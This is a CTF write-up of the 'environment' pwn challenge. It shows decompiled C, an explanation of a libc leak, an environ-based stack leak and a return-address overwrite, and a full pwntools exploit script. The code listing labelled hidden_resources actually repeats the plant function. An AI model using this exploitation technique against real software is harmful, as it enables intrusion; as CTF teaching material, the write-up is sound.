# environment

Last pwn challenge released on the second, by the time I get to know there was a new pwn challenge there was already a number of solves on it.

# Vulnerability

This challenge was a very good and like the previous one harvester required us to fullfil some of the constraints, well, it has all the protections enabled just NO PIE. Now, there was 2 usual functionalities given to us, being the `plant` and `recycle`, so let's reverse engineer the binary and see the underlying logic:-

```C
unsigned __int64 __fastcall recycle(__int64 a1, __int64 a2, int a3, int a4, int a5, int a6)
{
  int v6; // edx
  int v7; // ecx
  int v8; // er8
  int v9; // er9
  int v11; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v12; // [rsp+8h] [rbp-8h]

  v12 = __readfsqword(0x28u);
  v11 = 0;
  color((unsigned int)&unk_401B10, (unsigned int)"cyan", a3, a4, a5, a6);
  printf("> ");
  __isoc99_scanf(&unk_401B78, &v11);
  check_fun((unsigned int)rec_count);
  if ( v11 == 1 || v11 == 2 )
    form();
  else
    color((unsigned int)"Invalid option!\nWe are doomed!\n", (unsigned int)"red", v6, v7, v8, v9);
  return __readfsqword(0x28u) ^ v12;
}
```

The `recycle` function calls the `form` depending on what options we choose from the given two, during the `form` function call, we can see it does `check_fun` on the global variable `rec_count`. Let's check the `check_fun`:-

```C
unsigned __int64 __fastcall check_fun(int a1, __int64 a2, int a3, int a4, int a5, int a6)
{
  unsigned __int64 v7; // [rsp+18h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  if ( a1 < 0 || a1 > 11 )
  {
    color(
      (unsigned int)"We have plenty of this already.\nThanks for your help!\n",
      (unsigned int)"green",
      a3,
      a4,
      a5,
      a6);
    exit(1);
  }
  return __readfsqword(0x28u) ^ v7;
}
```

So, it peforms the check, given the first argument it calls the `exit` if the variable being compared is less than 0 or more than 11. This might become an issue for later, but we will see, now let's check the `form()` function:-

```C
unsigned __int64 __fastcall form(__int64 a1, __int64 a2, int a3, int a4, int a5, int a6)
{
  int v6; // edx
  int v7; // ecx
  int v8; // er8
  int v9; // er9
  char *s; // [rsp+0h] [rbp-30h]
  int buf; // [rsp+Ch] [rbp-24h] BYREF
  char nptr[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v14; // [rsp+28h] [rbp-8h]

  v14 = __readfsqword(0x28u);
  buf = 0;
  color((unsigned int)"Is this your first time recycling? (y/n)\n> ", (unsigned int)"magenta", a3, a4, a5, a6);
  read(0, &buf, 3uLL);
  putchar(10);
  if ( (_BYTE)buf == 110 || (_BYTE)buf == 78 )
    ++rec_count;
  if ( rec_count > 4 )
  {
    if ( rec_count > 9 )
    {
      if ( rec_count == 10 )
      {
        color(
          (unsigned int)"You have recycled 10 times! Feel free to ask me whatever you want.\n> ",
          (unsigned int)"cyan",
          v6,
          v7,
          v8,
          v9);
        read(0, nptr, 0x10uLL);
        s = (char *)strtoull(nptr, 0LL, 0);
        puts(s);
      }
    }
    else
    {
      color(
        (unsigned int)"You have already recycled at least 5 times! Please accept this gift: ",
        (unsigned int)"magenta",
        v6,
        v7,
        v8,
        v9);
      printf("[%p]\n", &printf);
    }
  }
  else
  {
    color(
      (unsigned int)"Thank you very much for participating in the recycling program!\n",
      (unsigned int)"magenta",
      v6,
      v7,
      v8,
      v9);
  }
  return __readfsqword(0x28u) ^ v14;
}
```

If we choose the `N` or `n` option when it asks if we are doing recycling first time, it'll increment the `rec_count` and once the value of the `rec_count` will be 10, it'll allow an arbitrary read from the address we give it or if the `rec_count` is equals to the value of 5, we will get the free LIBC leak, i.e. the `printf` address.

Now, that means, if we take this carefully, we can use this for the advantage of it to get LIBC leak and since the `check_fun` function will exit the program only if the `rec_count` will be over than 10, we can read value from any address.

Now, the `plant` function:-

```C
unsigned __int64 __fastcall plant(__int64 a1, __int64 a2, int a3, int a4, int a5, int a6)
{
  int v6; // edx
  int v7; // ecx
  int v8; // er8
  int v9; // er9
  int v10; // edx
  int v11; // ecx
  int v12; // er8
  int v13; // er9
  _QWORD *v15; // [rsp+0h] [rbp-50h]
  char buf[32]; // [rsp+10h] [rbp-40h] BYREF
  char nptr[24]; // [rsp+30h] [rbp-20h] BYREF
  unsigned __int64 v18; // [rsp+48h] [rbp-8h]

  v18 = __readfsqword(0x28u);
  check_fun(rec_count, a2, a3, a4, a5, a6);
  color((unsigned int)&unk_401A58, (unsigned int)"green", v6, v7, v8, v9);
  printf("> ");
  read(0, buf, 0x10uLL);
  v15 = (_QWORD *)strtoull(buf, 0LL, 0);
  putchar(10);
  color((unsigned int)"Where do you want to plant?\n1. City\n2. Forest\n", (unsigned int)"green", v10, v11, v12, v13);
  printf("> ");
  read(0, nptr, 0x10uLL);
  puts("Thanks a lot for your contribution!");
  *v15 = strtoull(nptr, 0LL, 0);
  rec_count = 22;
  return __readfsqword(0x28u) ^ v18;
}
```

The `plant` function allows us to do arbitrary write to a known address, well the issue is, once called the `plant` we can perform any other operations since `rec_count` will be 22, so that will be problem, so let's use it carefully.


We also have a function named `hidden_resources` which prints the flag:-

```C
unsigned __int64 __fastcall plant(__int64 a1, __int64 a2, int a3, int a4, int a5, int a6)
{
  int v6; // edx
  int v7; // ecx
  int v8; // er8
  int v9; // er9
  int v10; // edx
  int v11; // ecx
  int v12; // er8
  int v13; // er9
  _QWORD *v15; // [rsp+0h] [rbp-50h]
  char buf[32]; // [rsp+10h] [rbp-40h] BYREF
  char nptr[24]; // [rsp+30h] [rbp-20h] BYREF
  unsigned __int64 v18; // [rsp+48h] [rbp-8h]

  v18 = __readfsqword(0x28u);
  check_fun(rec_count, a2, a3, a4, a5, a6);
  color((unsigned int)&unk_401A58, (unsigned int)"green", v6, v7, v8, v9);
  printf("> ");
  read(0, buf, 0x10uLL);
  v15 = (_QWORD *)strtoull(buf, 0LL, 0);
  putchar(10);
  color((unsigned int)"Where do you want to plant?\n1. City\n2. Forest\n", (unsigned int)"green", v10, v11, v12, v13);
  printf("> ");
  read(0, nptr, 0x10uLL);
  puts("Thanks a lot for your contribution!");
  *v15 = strtoull(nptr, 0LL, 0);
  rec_count = 22;
  return __readfsqword(0x28u) ^ v18;
}
```

# Exploitation

Well, the leak phase is clear but the arbitrary write seems a bit confusing, considering the GOT is non-writable as FULL RELRO is enabled and at best we cannot overwrite the GOT, so that is out of option for us.
I was a bit stucked on it but that arbitrary read was on my mind for a bit, it must be there for a reason, and as the challenge name implies `environment`, this hinted towards `environ` pointer in LIBC, which contains the stack address and with the stack leak, we can calculate the `return address` and using the arbitrary write we can overwrite it with the address of `hidden_resources` function, now all the pieces falls into the place, then we have to as following:-

* Leak the LIBC from the `recycle` function by giving `n`.
* Once the base address is calculated, use the arbitrary read to get the stack address from the LIBC `environ`.
* Now, calculated the return address and overwrite it with the address of the `hidden_resources`.

```py
from pwn import *

def recycle():
	p.sendlineafter("> ", "2")
	p.sendlineafter("> ", "2")
	p.sendlineafter("> ", "N")

def plant(where, what):
	p.sendlineafter("> ", "1")
	p.sendlineafter("> ", str(where))
	p.sendlineafter("> ", str(what))

p = remote("206.189.121.131", 31886)
elf = ELF("environment")
libc = elf.libc

'''
Make rec_count 5 and get the printf@libc address
'''

for i in range(5):
	recycle()
p.recvuntil("0x")
libc.address = int(p.recvline().strip().replace(b"]", b""), 16) - libc.symbols['printf']
log.info(f"LIBC:   {hex(libc.address)}")


'''
Now, make the rec_count to 5 and leak the stack address by arbitrary read from the environ@libc
'''

for i in range(5):
	recycle()
p.sendlineafter("> ", str(libc.symbols['environ']))
p.recv(7)
stack = u64(p.recv(6).ljust(8, b"\x00"))
log.info(f"STACK:  {hex(stack)}")

ret = stack - 0x120 # return address
log.info(f"RET  :  {hex(ret)}")


'''
Overwrite the return_address with the hidden_resources to get the flag
'''
plant(ret, elf.symbols['hidden_resources'])
p.interactive()
```

Flag: `CHTB{u_s4v3d_th3_3nv1r0n_v4r14bl3!}`